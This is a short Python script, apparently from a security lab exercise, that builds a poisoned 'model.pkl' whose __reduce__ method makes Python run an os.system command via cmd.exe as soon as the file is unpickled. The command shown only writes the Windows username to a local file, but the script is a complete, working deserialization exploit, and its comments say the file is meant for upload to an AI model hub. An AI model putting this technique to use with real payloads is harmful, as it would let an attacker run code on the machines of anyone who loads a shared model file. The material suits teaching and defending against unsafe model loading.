# lab4/build_poisoned_model.py
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # This is the magic of the exploit. 
        # When Python 'unpickles' (loads) this file, it automatically executes this command.
        # We are telling Windows to echo the current username into a text file.
        command = 'cmd.exe /c "echo [CRITICAL] System breached via AI Model deserialization. Target User: %USERNAME% > ai_compromise.txt"'
        return (os.system, (command,))

print("[Attacker] Building malicious AI model payload...")
with open("model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)

print("[Attacker] 'model.pkl' created. Ready to be uploaded to an AI model hub.")